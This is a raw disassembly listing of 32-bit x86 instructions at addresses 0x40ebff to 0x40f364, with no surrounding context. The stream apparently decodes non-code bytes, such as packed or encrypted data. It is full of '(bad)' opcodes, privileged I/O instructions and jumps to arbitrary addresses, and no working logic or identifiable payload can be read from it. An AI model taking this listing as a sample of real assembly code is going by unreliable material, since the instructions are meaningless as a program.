  40ebff:	xchg   esp,ecx
  40ec01:	out    0x79,eax
  40ec03:	push   eax
  40ec04:	jmp    0x40ec55
  40ec06:	mov    ebp,0x53f10519
  40ec0b:	shl    eax,cl
  40ec0d:	sbb    esi,DWORD PTR gs:[edi+0x3]
  40ec11:	mov    cl,0xf7
  40ec13:	xchg   edx,eax
  40ec14:	mov    ah,0x4
  40ec16:	cmp    DWORD PTR [esi+0xbeb2983],esp
  40ec1c:	ror    DWORD PTR [esi],0xee
  40ec1f:	sbb    esi,DWORD PTR [ebp+0x50]
  40ec22:	mov    WORD PTR [ebx+0x41],ss
  40ec25:	or     DWORD PTR [ecx+0x7ba7f171],eax
  40ec2b:	mov    ds:0x449081b4,al
  40ec30:	ror    ah,0x18
  40ec33:	shl    BYTE PTR [edi+0x17],1
  40ec36:	cmp    BYTE PTR [eax+0x2b],cl
  40ec39:	fstp   DWORD PTR [edx+0xa1e987d]
  40ec3f:	icebp  
  40ec40:	sbb    edi,edi
  40ec42:	add    bl,bh
  40ec44:	xchg   DWORD PTR [ebp+0x3f],edi
  40ec47:	dec    edi
  40ec48:	or     al,0xc8
  40ec4a:	cmc    
  40ec4b:	test   DWORD PTR [esi-0x60],esp
  40ec4e:	into   
  40ec4f:	push   ebx
  40ec50:	or     eax,0x44dbbb38
  40ec55:	test   eax,0x8d4f7c53
  40ec5a:	mov    edi,0x605328f9
  40ec5f:	inc    eax
  40ec60:	adc    ecx,DWORD PTR [ebx+0x8]
  40ec63:	push   cs
  40ec64:	push   edi
  40ec65:	and    al,0xef
  40ec67:	xchg   esp,eax
  40ec68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec69:	xchg   edi,eax
  40ec6a:	loop   0x40ec83
  40ec6c:	mov    edi,0x7511ce5f
  40ec71:	pop    eax
  40ec72:	push   ds
  40ec73:	es test al,0x76
  40ec76:	fmul   st(4),st
  40ec78:	adc    esp,DWORD PTR [edx-0x50]
  40ec7b:	dec    ecx
  40ec7c:	sub    eax,0x234461b3
  40ec81:	jo     0x40ec16
  40ec83:	inc    esi
  40ec84:	dec    eax
  40ec85:	mov    cs,WORD PTR [edx+edx*4+0x86633e0]
  40ec8c:	fstp   TBYTE PTR [ebx+0x77a7dd4b]
  40ec92:	icebp  
  40ec93:	jmp    0xbc04e3e
  40ec98:	and    eax,0x70140772
  40ec9d:	pop    esp
  40ec9e:	loopne 0x40ec88
  40eca0:	ja     0x40ed15
  40eca2:	nop
  40eca3:	mov    edx,0x93b72854
  40eca8:	pop    es
  40eca9:	mov    ah,0xb8
  40ecab:	sbb    al,0x73
  40ecad:	out    0x45,eax
  40ecaf:	ins    DWORD PTR es:[edi],dx
  40ecb0:	and    BYTE PTR [edi+0x4ee02383],cl
  40ecb6:	mov    edx,0x3046c2d3
  40ecbb:	and    edx,DWORD PTR [eax+ebx*1-0x3d86f1e0]
  40ecc2:	imul   ecx,DWORD PTR gs:[ebp-0x75053d7],0xb35a2f2f
  40eccd:	xchg   ecx,eax
  40ecce:	(bad)  
  40ecd0:	mov    al,0xd0
  40ecd2:	cli    
  40ecd3:	jl     0x40ec64
  40ecd5:	push   0x40
  40ecd7:	aad    0x7b
  40ecd9:	jb     0x40ecb9
  40ecdb:	hlt    
  40ecdc:	int3   
  40ecdd:	mov    edi,0x363e9502
  40ece2:	int    0x79
  40ece4:	push   edi
  40ece5:	test   cl,cl
  40ece7:	(bad)  
  40ece8:	je     0x40ecb2
  40ecea:	lods   al,BYTE PTR ds:[esi]
  40eceb:	fdivr  st(0),st
  40eced:	aam    0xbe
  40ecef:	and    eax,DWORD PTR ds:0xf7c98936
  40ecf5:	mov    BYTE PTR [edi-0x5f1cf1da],ah
  40ecfb:	cdq    
  40ecfc:	je     0x40ed35
  40ecfe:	lods   al,BYTE PTR ds:[esi]
  40ecff:	jmp    0x40ecb7
  40ed01:	xlat   BYTE PTR ds:[ebx]
  40ed02:	aad    0xdc
  40ed04:	stos   DWORD PTR es:[edi],eax
  40ed05:	sbb    eax,0x471166f5
  40ed0a:	loope  0x40ed55
  40ed0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed0d:	ss fucomp st(3)
  40ed10:	push   ebx
  40ed11:	xchg   edi,eax
  40ed12:	inc    edx
  40ed13:	cmp    DWORD PTR [ecx+esi*8+0x77688113],edi
  40ed1a:	or     ebx,DWORD PTR [esi+0x18]
  40ed1d:	push   ecx
  40ed1e:	cmp    ah,dl
  40ed20:	aas    
  40ed21:	je     0x40eceb
  40ed23:	dec    ebp
  40ed24:	pop    ss
  40ed25:	push   esp
  40ed26:	rol    ebx,cl
  40ed28:	cwde   
  40ed29:	outs   dx,DWORD PTR ds:[esi]
  40ed2a:	push   cs
  40ed2b:	ror    BYTE PTR [ebp+0x28],1
  40ed2e:	xchg   ch,al
  40ed30:	sub    al,0xce
  40ed32:	xchg   edi,eax
  40ed33:	pop    ebp
  40ed34:	mov    al,ds:0x7459d1c6
  40ed39:	pmulhw mm1,mm2
  40ed3c:	inc    edx
  40ed3d:	mov    esp,0x28f8cc
  40ed42:	inc    eax
  40ed43:	lods   eax,DWORD PTR ds:[esi]
  40ed44:	xchg   BYTE PTR [ecx],al
  40ed46:	and    al,0xd
  40ed48:	(bad)  
  40ed49:	jg     0x40ed0f
  40ed4b:	and    ch,BYTE PTR [edx]
  40ed4d:	popa   
  40ed4e:	xchg   ecx,eax
  40ed4f:	mov    ecx,DWORD PTR [ebx+0x15ea632a]
  40ed55:	mov    edi,0x40bc1287
  40ed5a:	cwde   
  40ed5b:	out    dx,eax
  40ed5c:	push   edi
  40ed5d:	push   ds
  40ed5e:	mov    ds:0x39ef93a4,al
  40ed63:	ret    
  40ed64:	cdq    
  40ed65:	sbb    esi,DWORD PTR [ebx+ecx*2]
  40ed68:	and    eax,0xbc04e8a
  40ed6d:	or     BYTE PTR [esi+0x44d8125e],ch
  40ed73:	(bad)  
  40ed74:	jns    0x40ed9a
  40ed76:	mov    ds:0x122214cc,eax
  40ed7b:	sub    esi,DWORD PTR es:[ebx]
  40ed7e:	sbb    eax,0x8e79f7e4
  40ed83:	ret    
  40ed84:	xchg   esi,eax
  40ed85:	dec    eax
  40ed86:	sub    DWORD PTR [esp+edx*1-0x6f1cc38c],edi
  40ed8d:	aaa    
  40ed8e:	aaa    
  40ed8f:	push   esi
  40ed90:	mov    bl,0x4
  40ed92:	out    dx,al
  40ed93:	and    dh,al
  40ed95:	sbb    al,0x60
  40ed97:	neg    DWORD PTR [esi-0x10af662e]
  40ed9d:	ror    DWORD PTR [ebx+0xdd9b7d7],cl
  40eda3:	sbb    DWORD PTR ds:0x1adba5a6,0xc
  40edaa:	mov    ds,ebx
  40edac:	push   edi
  40edad:	stos   BYTE PTR es:[edi],al
  40edae:	(bad)  
  40edaf:	mov    esp,0xaee89ead
  40edb4:	pop    edx
  40edb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edb6:	mov    dl,0x72
  40edb8:	popf   
  40edb9:	pop    ss
  40edba:	outs   dx,BYTE PTR ds:[esi]
  40edbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edbc:	pop    ebx
  40edbd:	loopne 0x40edef
  40edbf:	shr    BYTE PTR [edi-0x5f],1
  40edc2:	mov    al,dl
  40edc4:	fwait
  40edc5:	jmp    0x40ee38
  40edc7:	(bad)  
  40edc9:	or     esp,edx
  40edcb:	test   edx,ebp
  40edcd:	or     al,0xb8
  40edcf:	imul   esp,DWORD PTR [ebp+0x3a],0x66a1b731
  40edd6:	pop    ebp
  40edd7:	push   ebp
  40edd8:	cmp    eax,0x893820a1
  40eddd:	dec    ebp
  40edde:	mov    esp,0x8bf3efa4
  40ede3:	pushf  
  40ede4:	or     ch,BYTE PTR [ebx-0x387c4280]
  40edea:	cs push eax
  40edec:	push   edi
  40eded:	jb     0x40edd9
  40edef:	add    BYTE PTR [edi-0xa583e2d],ch
  40edf5:	sbb    DWORD PTR [ecx],0xffffffa6
  40edf8:	cmp    dh,dh
  40edfa:	shr    DWORD PTR [eax-0x27],0xa
  40edfe:	fcomp  st(0)
  40ee00:	mov    ch,0x16
  40ee02:	(bad)  
  40ee03:	sbb    BYTE PTR [esp+ecx*8-0x24],bh
  40ee07:	mul    BYTE PTR [ecx-0x60]
  40ee0a:	and    ebp,esi
  40ee0c:	repnz sub bl,dl
  40ee0f:	(bad)  
  40ee10:	or     eax,0x4dc19c71
  40ee15:	ins    DWORD PTR es:[edi],dx
  40ee16:	and    eax,0x5d44eaba
  40ee1b:	xchg   ebp,eax
  40ee1c:	cmp    DWORD PTR [ecx-0x2d],edx
  40ee1f:	push   0x1683bdf8
  40ee24:	sbb    BYTE PTR [eax-0x21474dea],ah
  40ee2a:	xor    al,0x4a
  40ee2c:	(bad)  
  40ee2e:	lahf   
  40ee2f:	repz fwait
  40ee31:	mov    ebp,0x1c6565a
  40ee36:	mov    ah,0x25
  40ee38:	inc    ebx
  40ee39:	push   cs
  40ee3a:	xchg   esi,eax
  40ee3b:	(bad)  
  40ee3d:	cld    
  40ee3e:	mov    dl,0x6d
  40ee40:	loop   0x40ee72
  40ee42:	add    edi,ecx
  40ee44:	ins    BYTE PTR es:[edi],dx
  40ee45:	icebp  
  40ee46:	jnp    0x40edf3
  40ee48:	dec    esp
  40ee49:	leave  
  40ee4a:	ret    0xc003
  40ee4d:	push   ss
  40ee4e:	or     ebx,DWORD PTR [ebx-0x1c]
  40ee51:	pop    ebp
  40ee52:	test   BYTE PTR [eax+0x48df03ef],bl
  40ee58:	mov    bl,0x5b
  40ee5a:	hlt    
  40ee5b:	xor    DWORD PTR [ebx+0x4f2bd457],0x9
  40ee62:	add    eax,0x82ce9fb6
  40ee67:	ins    DWORD PTR es:[edi],dx
  40ee68:	shl    edx,0x7b
  40ee6b:	jp     0x40ee63
  40ee6d:	mov    eax,0x516e92be
  40ee72:	dec    ecx
  40ee73:	mov    edx,0x9345b148
  40ee78:	mov    ebx,0xd796e3f1
  40ee7d:	sub    eax,0x71b7a6dd
  40ee82:	mov    dl,0xf2
  40ee84:	into   
  40ee85:	gs fucomip st,st(7)
  40ee88:	sbb    DWORD PTR [ebp-0x42],0x6b
  40ee8c:	stos   DWORD PTR es:[edi],eax
  40ee8d:	call   0x378f9c59
  40ee92:	jle    0x40ee44
  40ee94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee95:	and    edi,esi
  40ee97:	ret    
  40ee98:	cmp    ebx,DWORD PTR [ecx]
  40ee9a:	sub    ah,BYTE PTR [edi+0x79]
  40ee9d:	jmp    0x40ee73
  40ee9f:	imul   ecx,DWORD PTR [edi-0x4f565370],0x20
  40eea6:	in     eax,0x9a
  40eea8:	pop    ebx
  40eea9:	lods   al,BYTE PTR ds:[esi]
  40eeaa:	clc    
  40eeab:	mov    eax,ds:0x66b1e55a
  40eeb0:	pop    edx
  40eeb1:	or     ecx,DWORD PTR [ecx]
  40eeb3:	(bad)  
  40eeb4:	cmp    eax,0xe96a83b5
  40eeb9:	imul   edi,DWORD PTR [eax+0x31d49ae6],0x4a76d9df
  40eec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec4:	arpl   WORD PTR [ecx-0x3],dx
  40eec7:	push   0xffffffc0
  40eec9:	inc    ebp
  40eeca:	rcr    DWORD PTR [ebp+0x3e],0xfd
  40eece:	jnp    0x40ef2c
  40eed0:	or     ch,BYTE PTR [edi-0x1c1469ac]
  40eed6:	sahf   
  40eed7:	push   es
  40eed8:	sub    BYTE PTR [esi+eax*4+0x6a],cl
  40eedc:	pop    ecx
  40eedd:	mov    ah,0xb2
  40eedf:	pop    ebp
  40eee0:	push   esp
  40eee1:	pop    ss
  40eee2:	jno    0x40eec1
  40eee4:	iret   
  40eee5:	xor    bl,BYTE PTR [ecx]
  40eee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eee8:	mov    ecx,0x841e8532
  40eeed:	dec    ebx
  40eeee:	push   es
  40eeef:	imul   esp,DWORD PTR [eax-0x4d],0x8e2a3a85
  40eef6:	mov    ebp,DWORD PTR [esp+ebp*8]
  40eef9:	dec    ebp
  40eefa:	cmp    esi,DWORD PTR [ebp-0x67]
  40eefd:	jb     0x40eedc
  40eeff:	mov    bl,0x10
  40ef01:	pop    ebp
  40ef02:	and    DWORD PTR [edx+ebp*1-0x28b71a40],ebp
  40ef09:	data16 int 0x95
  40ef0c:	aaa    
  40ef0d:	and    ch,BYTE PTR [ecx-0x32]
  40ef10:	popf   
  40ef11:	add    DWORD PTR [edx],esi
  40ef13:	cli    
  40ef14:	xchg   ebp,eax
  40ef15:	adc    BYTE PTR [ecx+esi*1-0x21],bh
  40ef19:	adc    eax,0x92fa680b
  40ef1e:	fild   DWORD PTR [ebx+eiz*2-0x33]
  40ef22:	arpl   WORD PTR [ebp-0x6c77c710],dx
  40ef28:	dec    esp
  40ef29:	push   edx
  40ef2a:	xchg   esi,eax
  40ef2b:	xor    dh,BYTE PTR [eax+0x67]
  40ef2e:	leave  
  40ef2f:	(bad)  
  40ef30:	pop    ebx
  40ef31:	push   ecx
  40ef32:	xchg   DWORD PTR [ebp-0x21caa3a8],ebx
  40ef38:	jns    0x40ef99
  40ef3a:	fisubr DWORD PTR [edi+ebx*1]
  40ef3d:	dec    edx
  40ef3e:	test   al,0x2b
  40ef40:	in     al,dx
  40ef41:	or     edi,DWORD PTR [ecx-0x6b]
  40ef44:	scas   eax,DWORD PTR es:[edi]
  40ef45:	outs   dx,DWORD PTR ds:[esi]
  40ef46:	aaa    
  40ef47:	xchg   edi,eax
  40ef48:	mov    bh,0xde
  40ef4a:	shr    BYTE PTR [ecx-0x1],0x88
  40ef4e:	stos   BYTE PTR es:[edi],al
  40ef4f:	cmp    eax,0x93e5f076
  40ef54:	mov    al,ds:0xe64ab4d9
  40ef59:	lock mov esi,ebp
  40ef5c:	fbld   TBYTE PTR [ebp+0x4b729b78]
  40ef62:	inc    edi
  40ef63:	(bad)  
  40ef64:	jl     0x40efde
  40ef66:	or     DWORD PTR ds:0xd31dfb09,0xf4c35ab3
  40ef70:	dec    eax
  40ef71:	aad    0x22
  40ef73:	pop    ebx
  40ef74:	leave  
  40ef75:	add    al,0xc1
  40ef77:	inc    ebp
  40ef78:	lods   eax,DWORD PTR ds:[esi]
  40ef79:	mov    esi,DWORD PTR [ebp-0x67]
  40ef7c:	mov    ebx,0x2053c10b
  40ef81:	daa    
  40ef82:	(bad)  
  40ef83:	repnz adc ebp,DWORD PTR [eax+0x26]
  40ef87:	cmp    DWORD PTR [ebx],esp
  40ef89:	push   ecx
  40ef8a:	inc    BYTE PTR [edi-0x2ae979d1]
  40ef90:	push   ecx
  40ef91:	cmp    cl,BYTE PTR [esi+eiz*1+0x1daf6ccf]
  40ef98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef99:	xor    ch,dl
  40ef9b:	sbb    al,0xe2
  40ef9d:	aas    
  40ef9e:	xchg   DWORD PTR [ebp-0xf],edi
  40efa1:	jp     0x40ef41
  40efa3:	add    ebp,ebx
  40efa5:	jne    0x40ef5f
  40efa7:	and    eax,0x948d7914
  40efac:	stc    
  40efad:	fcomp  QWORD PTR [edi+0x787ea2d2]
  40efb3:	cmp    al,0x45
  40efb5:	js     0x40efea
  40efb7:	jge    0x40efb5
  40efb9:	lods   eax,DWORD PTR ds:[esi]
  40efba:	inc    ecx
  40efbb:	fcomp  QWORD PTR [ecx+0x27160131]
  40efc1:	std    
  40efc2:	sbb    DWORD PTR [esi+0x38c4da7e],0x58
  40efc9:	lea    edi,[ecx-0xc]
  40efcc:	mov    dl,0x56
  40efce:	(bad)  [ecx+edi*2+0x252aed9c]
  40efd5:	cmp    DWORD PTR [ecx+0x1c],ebx
  40efd8:	jnp    0x40efd4
  40efda:	xchg   edx,eax
  40efdb:	sbb    eax,0x458f0821
  40efe0:	paddb  mm4,QWORD PTR [edi-0x733b6fe4]
  40efe7:	in     al,dx
  40efe8:	jbe    0x40f00d
  40efea:	mov    bh,BYTE PTR [ecx-0x6c]
  40efed:	mov    cl,0x1c
  40efef:	adc    BYTE PTR [edi+0x6a],0x30
  40eff3:	sar    BYTE PTR [edi],1
  40eff5:	ds inc ebp
  40eff7:	sub    dl,dl
  40eff9:	enter  0x4db1,0x5
  40effd:	in     eax,dx
  40effe:	fld    TBYTE PTR ds:0xc3e77657
  40f004:	push   ss
  40f005:	xchg   ecx,edx
  40f007:	test   eax,0xfe24e61f
  40f00c:	sub    DWORD PTR [ebx],esi
  40f00e:	jb     0x40f04b
  40f010:	push   edi
  40f011:	cmc    
  40f012:	in     al,0x7f
  40f014:	mov    ah,ch
  40f016:	iret   
  40f017:	push   edi
  40f018:	jg     0x40f001
  40f01a:	in     al,0xca
  40f01c:	lods   al,BYTE PTR ds:[esi]
  40f01d:	push   0xc
  40f01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f020:	cwde   
  40f021:	ins    DWORD PTR es:[edi],dx
  40f022:	imul   eax,DWORD PTR [ebx],0x45
  40f025:	lods   eax,DWORD PTR ds:[esi]
  40f026:	mov    eax,ds:0x47eb295a
  40f02b:	push   esp
  40f02c:	shl    DWORD PTR [edi+0x48],1
  40f02f:	xchg   DWORD PTR [edx],esp
  40f031:	add    eax,0x44a120bc
  40f036:	imul   edx,ebx,0x6a
  40f039:	(bad)  [eax-0x73]
  40f03c:	adc    edi,DWORD PTR [edi+0x50174068]
  40f042:	(bad)  
  40f043:	imul   BYTE PTR [esi]
  40f045:	lds    edi,FWORD PTR [eax]
  40f047:	pop    ss
  40f048:	mov    ebx,0xb7f5e2dd
  40f04d:	clc    
  40f04e:	stc    
  40f04f:	mov    esi,es
  40f051:	in     al,0x34
  40f053:	push   esi
  40f054:	push   ebx
  40f055:	js     0x40f038
  40f057:	xchg   ebx,eax
  40f058:	sar    ah,1
  40f05a:	dec    edx
  40f05b:	mov    DWORD PTR [edx],ecx
  40f05d:	push   ebx
  40f05e:	pop    ds
  40f05f:	ret    
  40f060:	pop    esi
  40f061:	sub    DWORD PTR [edi-0x4256940b],edx
  40f067:	or     eax,0xada7554e
  40f06c:	xchg   edx,eax
  40f06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f06e:	pop    ss
  40f06f:	xchg   esp,eax
  40f070:	xor    ecx,DWORD PTR [edx]
  40f072:	fs sti 
  40f074:	lock fiadd WORD PTR [ecx+esi*8-0x1edefb21]
  40f07c:	mov    ebx,esp
  40f07e:	jnp    0x40f08e
  40f080:	push   cs
  40f081:	cld    
  40f082:	xchg   edx,eax
  40f083:	ret    
  40f084:	adc    al,0xc5
  40f086:	inc    esi
  40f087:	xor    DWORD PTR [ecx+0x4a],ecx
  40f08a:	xor    BYTE PTR [ebx+eiz*4+0x4a],cl
  40f08e:	mov    esp,0xc2589b75
  40f093:	aam    0xec
  40f095:	ret    
  40f096:	dec    edi
  40f097:	inc    edx
  40f098:	jmp    0xc9c6286c
  40f09d:	repz cld 
  40f09f:	add    bl,BYTE PTR [edx+0x2c]
  40f0a2:	and    eax,0x5fa83f33
  40f0a7:	push   ebx
  40f0a8:	dec    ebx
  40f0a9:	pop    ebx
  40f0aa:	sbb    al,0x72
  40f0ac:	call   0x7643:0x7961aad3
  40f0b3:	cmp    eax,0x7eebc78c
  40f0b8:	es jmp 0x8d9:0x8c59855d
  40f0c0:	shl    bl,1
  40f0c2:	dec    eax
  40f0c3:	dec    ecx
  40f0c4:	jae    0x40f10b
  40f0c6:	pandn  mm4,QWORD PTR ds:0x26097503
  40f0cd:	int    0x2f
  40f0cf:	xchg   BYTE PTR [ebp+0x49],bh
  40f0d2:	push   ss
  40f0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0d4:	(bad)  
  40f0d5:	iret   
  40f0d6:	scas   al,BYTE PTR es:[edi]
  40f0d7:	jb     0x40f095
  40f0d9:	(bad)  
  40f0da:	aad    0x6d
  40f0dc:	das    
  40f0dd:	adc    eax,0xf6cbe4d3
  40f0e2:	pop    edx
  40f0e3:	mov    BYTE PTR es:[eax+edx*1+0x29f8e147],ch
  40f0eb:	or     eax,edx
  40f0ed:	in     al,0x17
  40f0ef:	std    
  40f0f0:	mov    DWORD PTR [eax+0x9],ebx
  40f0f3:	es in  al,dx
  40f0f5:	(bad)  
  40f0f6:	adc    ah,BYTE PTR [ebx]
  40f0f8:	xor    edx,esp
  40f0fa:	cmp    al,0x36
  40f0fc:	mov    dl,0xfd
  40f0fe:	(bad)  
  40f100:	pop    edi
  40f101:	repnz pop ebp
  40f103:	mov    es,WORD PTR [ebp-0x7b]
  40f106:	aad    0x28
  40f108:	fwait
  40f109:	aam    0xeb
  40f10b:	sti    
  40f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10d:	xor    esi,DWORD PTR [ecx]
  40f10f:	pop    ss
  40f110:	inc    edx
  40f111:	mov    esi,0x8477fe91
  40f116:	mov    al,ds:0x595bf469
  40f11b:	dec    ebx
  40f11c:	mov    esi,0x686d93cc
  40f121:	jmp    0x6bb220c7
  40f126:	mov    ebx,0x6851fb8d
  40f12b:	jns    0x40f0bd
  40f12d:	pushf  
  40f12e:	loopne 0x40f162
  40f130:	add    bh,BYTE PTR [eax]
  40f132:	clc    
  40f133:	(bad)  
  40f134:	xor    ebp,DWORD PTR [ebx+edi*1+0x2]
  40f138:	es push edi
  40f13a:	hlt    
  40f13b:	push   ebp
  40f13c:	sahf   
  40f13d:	mov    al,ds:0xd533d5d9
  40f142:	or     edx,edx
  40f144:	stos   BYTE PTR es:[edi],al
  40f145:	rcl    BYTE PTR [ebp-0x3f],1
  40f148:	xchg   edx,eax
  40f149:	jne    0x40f1af
  40f14b:	sar    BYTE PTR [eax],0xdb
  40f14e:	xchg   esp,eax
  40f14f:	cmc    
  40f150:	sub    ecx,DWORD PTR [edx-0x8]
  40f153:	adc    eax,0xeadf1154
  40f158:	fisubr DWORD PTR [ebx+0x5c]
  40f15b:	out    dx,eax
  40f15c:	out    dx,al
  40f15d:	sub    al,0x3b
  40f15f:	stos   BYTE PTR es:[edi],al
  40f160:	aas    
  40f161:	sbb    edi,0x5be16e43
  40f167:	mov    eax,ds:0x399f298b
  40f16c:	es mov gs,ecx
  40f16f:	aas    
  40f170:	or     eax,0x509ed2e8
  40f175:	sahf   
  40f176:	and    ch,BYTE PTR [edi-0x4d756bea]
  40f17c:	adc    al,0xf0
  40f17e:	mov    ebp,0x8f41492c
  40f183:	stc    
  40f184:	pop    ss
  40f185:	push   0x8401123b
  40f18a:	mov    eax,ds:0x8ae87ecc
  40f18f:	mov    eax,ds:0x4a2d9c5b
  40f194:	cmp    eax,0x3fe77c10
  40f199:	in     eax,0xe4
  40f19b:	mov    al,0xcf
  40f19d:	inc    eax
  40f19e:	push   edi
  40f19f:	push   esp
  40f1a0:	mov    ch,0xbc
  40f1a2:	retf   0x105a
  40f1a5:	call   0x997d26a7
  40f1aa:	div    DWORD PTR [edx-0x3d559714]
  40f1b0:	aas    
  40f1b1:	or     cl,al
  40f1b3:	mov    WORD PTR [eax-0x6dc6b0b4],ss
  40f1b9:	les    edi,FWORD PTR [edx]
  40f1bb:	xor    DWORD PTR [ebp-0x71bd4dbb],ebp
  40f1c1:	push   0x16f503b9
  40f1c6:	fs leave 
  40f1c8:	aad    0xa2
  40f1ca:	pop    esp
  40f1cb:	xchg   BYTE PTR [ecx-0x2a],cl
  40f1ce:	aam    0x56
  40f1d0:	push   cs
  40f1d1:	into   
  40f1d2:	cwde   
  40f1d3:	mov    ds:0x8078be1a,al
  40f1d8:	repnz or edi,DWORD PTR [edx-0x36]
  40f1dc:	stc    
  40f1dd:	mov    esi,0x35f48bb
  40f1e2:	xor    al,0x4
  40f1e4:	cmc    
  40f1e5:	js     0x40f1c8
  40f1e7:	add    ecx,DWORD PTR [edx]
  40f1e9:	mov    ah,0x36
  40f1eb:	xchg   edi,eax
  40f1ec:	or     esi,edi
  40f1ee:	js     0x40f1dc
  40f1f0:	ss pusha 
  40f1f2:	inc    edi
  40f1f3:	ret    
  40f1f4:	xlat   BYTE PTR ds:[ebx]
  40f1f5:	repz ss xchg esp,eax
  40f1f8:	rcl    BYTE PTR [ebp-0x40],1
  40f1fb:	in     eax,dx
  40f1fc:	xor    eax,0x25c464a2
  40f201:	add    al,0x8e
  40f203:	mov    bl,0x51
  40f205:	xchg   ecx,eax
  40f206:	stc    
  40f207:	mov    ebp,0xe2a5f2d9
  40f20c:	not    BYTE PTR [ebp+0x3f]
  40f20f:	inc    ebx
  40f210:	clc    
  40f211:	aam    0x42
  40f213:	mov    cl,0x5e
  40f215:	cmp    BYTE PTR [esi+0x2af7ae93],al
  40f21b:	sbb    ebx,esp
  40f21d:	ds add al,0x78
  40f220:	add    al,0x9d
  40f222:	and    al,0x46
  40f224:	add    eax,0x920af318
  40f229:	pop    edi
  40f22a:	and    eax,0xe6a4c56f
  40f22f:	nop
  40f230:	dec    DWORD PTR ds:0x889fc1db
  40f236:	mov    ebx,0x2a91dc23
  40f23b:	inc    ecx
  40f23c:	xchg   edi,eax
  40f23d:	pop    ds
  40f23e:	mov    DWORD PTR [eax],ecx
  40f240:	fadd   DWORD PTR [edi+0x59]
  40f243:	jg     0x40f29b
  40f245:	into   
  40f246:	test   eax,0x1afe0c42
  40f24b:	xor    DWORD PTR [edx+0x1d02b2fb],eax
  40f251:	loope  0x40f203
  40f253:	std    
  40f254:	mov    bl,0xc4
  40f256:	sub    DWORD PTR [eax-0x2e0d5232],eax
  40f25c:	adc    edi,DWORD PTR [edi]
  40f25e:	pop    eax
  40f25f:	mov    bh,0xec
  40f261:	jns    0x40f1f3
  40f263:	test   BYTE PTR [ecx],bh
  40f265:	xchg   esp,eax
  40f266:	aas    
  40f267:	(bad)  
  40f268:	repnz in eax,0x64
  40f26b:	lock push esp
  40f26d:	xor    eax,0x521288c1
  40f272:	leave  
  40f273:	mov    DWORD PTR ds:[ebp-0x6f8e43a4],edx
  40f27a:	jne    0x40f202
  40f27c:	daa    
  40f27d:	cmp    eax,0xd08a63fb
  40f282:	call   0x7f7387ae
  40f287:	jns    0x40f2b1
  40f289:	imul   esi,DWORD PTR [ebp+0x533d7ea],0xe2f826e3
  40f293:	pop    esi
  40f295:	ret    0xda71
  40f298:	xchg   ecx,eax
  40f299:	push   ebp
  40f29a:	shr    BYTE PTR [eax+0x39],cl
  40f29d:	inc    ebx
  40f29e:	dec    edx
  40f29f:	in     al,0xd9
  40f2a1:	xchg   dh,al
  40f2a3:	mov    cl,0x87
  40f2a5:	retf   0x6af7
  40f2a8:	repnz dec BYTE PTR [ebx+0x24]
  40f2ac:	ins    BYTE PTR es:[edi],dx
  40f2ad:	(bad)  
  40f2ae:	in     eax,0x75
  40f2b0:	push   eax
  40f2b1:	(bad)  
  40f2b2:	adc    esp,edi
  40f2b4:	fwait
  40f2b5:	sahf   
  40f2b6:	xchg   esp,eax
  40f2b7:	cdq    
  40f2b8:	clc    
  40f2b9:	mov    esp,0x884a53f1
  40f2be:	gs inc eax
  40f2c0:	dec    eax
  40f2c1:	push   cs
  40f2c2:	mov    eax,0x5e64a04f
  40f2c7:	xchg   esp,eax
  40f2c8:	push   0xf
  40f2ca:	and    BYTE PTR [ebp+0x2b],dh
  40f2cd:	mov    ebp,fs
  40f2cf:	add    BYTE PTR [edi-0x1be72cf5],dh
  40f2d5:	cmp    al,0xd4
  40f2d7:	mov    ?,WORD PTR ds:0x367e5d03
  40f2dd:	push   ebx
  40f2de:	stc    
  40f2df:	sbb    ecx,DWORD PTR [esi-0x33]
  40f2e2:	(bad)  
  40f2e3:	mov    cl,BYTE PTR [eax+0x5c80293f]
  40f2e9:	xchg   ebp,eax
  40f2ea:	and    cl,BYTE PTR [eax+edi*8+0x79]
  40f2ee:	cwde   
  40f2ef:	fwait
  40f2f0:	push   cs
  40f2f1:	push   edx
  40f2f2:	test   BYTE PTR [edi-0x52c95337],al
  40f2f8:	gs pop ds
  40f2fa:	cmp    eax,0x66842be4
  40f2ff:	mov    ebp,ecx
  40f301:	add    al,0x48
  40f303:	jae    0x40f33e
  40f305:	xor    DWORD PTR cs:[ecx],edi
  40f308:	mov    al,es:0x1bf07016
  40f30e:	add    cl,ah
  40f310:	es mov ecx,0xac43fdbf
  40f316:	or     ebp,eax
  40f318:	cmp    DWORD PTR [esi+0x3f82d8ce],edx
  40f31e:	je     0x40f337
  40f320:	mov    edx,0xa01db3be
  40f325:	sbb    BYTE PTR [edx],0xb9
  40f328:	pop    ds
  40f329:	xchg   edi,eax
  40f32a:	pop    es
  40f32b:	sub    eax,0xa621f4d7
  40f330:	cwde   
  40f331:	lds    eax,FWORD PTR [edx]
  40f333:	push   edx
  40f334:	nop
  40f335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f336:	adc    BYTE PTR [edi+0x4a],0xab
  40f33a:	scas   eax,DWORD PTR es:[edi]
  40f33b:	push   cs
  40f33c:	adc    cl,BYTE PTR [edi]
  40f33e:	dec    ebp
  40f33f:	cmp    DWORD PTR [esi-0x54],ebp
  40f342:	sbb    eax,0xb3933e76
  40f347:	cli    
  40f348:	aas    
  40f349:	or     al,0xff
  40f34b:	xor    eax,0x3669e465
  40f350:	les    eax,FWORD PTR [ebx]
  40f352:	inc    edx
  40f353:	adc    bl,BYTE PTR [ecx-0x5b00b95d]
  40f359:	adc    al,0xa4
  40f35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f35c:	push   esp
  40f35d:	std    
  40f35e:	dec    edx
  40f35f:	pop    esp
  40f360:	inc    ebp
  40f361:	idiv   BYTE PTR es:[esi]
  40f364:	jge    0x40f33b
